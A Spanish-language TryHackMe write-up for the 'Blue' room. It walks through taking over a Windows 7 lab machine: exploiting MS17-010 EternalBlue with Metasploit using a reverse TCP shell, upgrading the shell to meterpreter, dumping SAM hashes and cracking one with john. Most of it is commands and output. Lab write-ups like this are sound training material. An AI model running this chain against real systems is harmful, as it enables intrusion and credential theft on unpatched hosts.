# Blue — Writeup

**Fecha:** 10-10-2025\
**Plataforma:** TryHackMe

---

## TL;DR

Se identificaron puertos RPC/SMB en una máquina con Windows 7 (especialmente el servicio SMB en el puerto 445). Se explotó la vulnerabilidad MS17-010 (module ms17_010_eternalblue en Metasploit) para obtener una shell remota, se elevó/convertió la sesión a meterpreter y se migró a services.exe para mayor estabilidad; desde ahí se volcó el SAM con hashdump, se crackeó la contraseña del usuario Jon usando john con la wordlist rockyou.txt, y con ese acceso se recopilaron las flags leyendo /flag1.txt, /Windows/system32/config/flag2.txt y /Users/Jon/Documents/flag3.txt.

---

## Enumeration (nmap)

```bash
nmap -sV -sC --open $IP -oN scan.txt
```

**Comment:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.

**Result**
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

**Relevant Result**
* 445/tcp open microsoft-ds (Windows 7)
  
---

## Foothold (Metasploit)
**Search Exploit**
```bash
  $ msfconsole
  msf > search windows 7 eternalblue
#   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010
```
**Comment:** ``msfconsole`` abre la interfaz de Metasploit.


**Set Exploit**
```bash
  msf > Use 0
  msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS $MACHINEIP
  msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST $LOCALIP
  msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
```

**Run Exploit**
```bash
  msf exploit(windows/smb/ms17_010_eternalblue) > run
	{...}
  meterpreter > 
```
## Privilege Escalation

**Shell to Meterpreter**
```bash
 meterpreter > (CTRL+Z) 
Background session 1? [y/N] y
msf > search shell_to_meterpreter
#  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade
```
**List Sessions**
```bash
msf post(multi/manage/shell_to_meterpreter) > sessions -l
Active sessions
===============
  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows		 Shell Banner: Microsoft Windows [Version 6.1.7601] -----  $IP -> $IP ($IP)

```
**Set & Run Meterpreter Shell**
```bash
 msf > Use 0
 msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
 msf post(multi/manage/shell_to_meterpreter) > run
		{...}
 msf post(multi/manage/shell_to_meterpreter) > sessions -l
Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  1         shell x64/windows		 Shell Banner: Microsoft Windows [Version 6.1.7601] -----  $IP -> $IP ($IP)
  2			meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              $IP -> $IP ($IP)

 msf post(multi/manage/shell_to_meterpreter) > sessions 2
 meterpreter >
```

**Migrate Shell**
```bash
meterpreter > ps
Process List
============

 PID   PPID  Name            Arch  Session  User                      Path
 ---   ----  ----            ----  -------  ----                      ----
 716   616   services.exe    x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\serv
                                                                      ices.exe
meterpreter > migrate 716
[*] Migrating from 704 to 716...
[*] Migration completed successfully.
```
**Comment:** Migramos la shell a un proceso mas estable.

## Hash
**Getting Hash**
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Cracking**
```bash
$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > userhash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT userhash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED         (?)     
1g 0:00:00:01 DONE (2025-10-10 15:29) 0.9174g/s 9358Kp/s 9358Kc/s 9358KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

## Flags
**Flag 1**
```bash
meterpreter > cd /
meterpreter > cat flag1.txt
```

**Flag 2**
```bash
meterpreter > cd /Windows/system32/config
meterpreter > cat flag2.txt
```

**Flag 3**
```bash
meterpreter > cd /Users/Jon/Documents
meterpreter > cat flag3.txt
```
